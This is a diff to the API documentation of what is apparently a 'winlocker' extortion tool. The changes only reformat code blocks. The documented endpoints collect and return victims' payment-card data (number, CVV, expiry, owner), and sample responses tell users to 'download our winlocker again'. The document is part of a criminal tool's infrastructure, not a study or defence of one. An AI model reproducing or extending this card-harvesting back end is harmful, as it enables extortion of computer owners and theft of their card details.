@@ -60,7 +60,7 @@ fetch("http://localhost:3000/card", requestOptions)
   
 ~-~ Response sample: 
 
-```javascript
+```json
 {
     "ok": true,
     "message": "Successful! Download our winlocker again!"
@@ -89,15 +89,15 @@ fetch("http://localhost:3000/get_cards", requestOptions)
 
 ~-~ Response sample:
 
-```
+```json
 [
-{
-"digits": "4111111111111111",
-"cvv": "111",
-"date": "M/YY",
-"owner": "SERNAME NAME",
-"card_details_error": null
-}
+    {
+        "digits": "4111111111111111",
+        "cvv": "111",
+        "date": "M/YY",
+        "owner": "SERNAME NAME",
+        "card_details_error": null
+    }
 ]
 ```
 
@@ -123,15 +123,15 @@ fetch("http://localhost:3000/", requestOptions)
 <!DOCTYPE html>
 <html>
 
-<head>
-	<title>Winlock API Say BB ur PC bruh xd</title>
-	<link rel="stylesheet" href="/stylesheets/style.css">
-</head>
+	<head>
+		<title>Winlock API Say BB ur PC bruh xd</title>
+		<link rel="stylesheet" href="/stylesheets/style.css">
+	</head>
 
-<body>
-	<h1>Winlock API Say BB ur PC bruh xd</h1>
-	<p>Welcome to Winlock API Say BB ur PC bruh xd</p>
-</body>
+	<body>
+		<h1>Winlock API Say BB ur PC bruh xd</h1>
+		<p>Welcome to Winlock API Say BB ur PC bruh xd</p>
+	</body>
 
 </html>
 ```
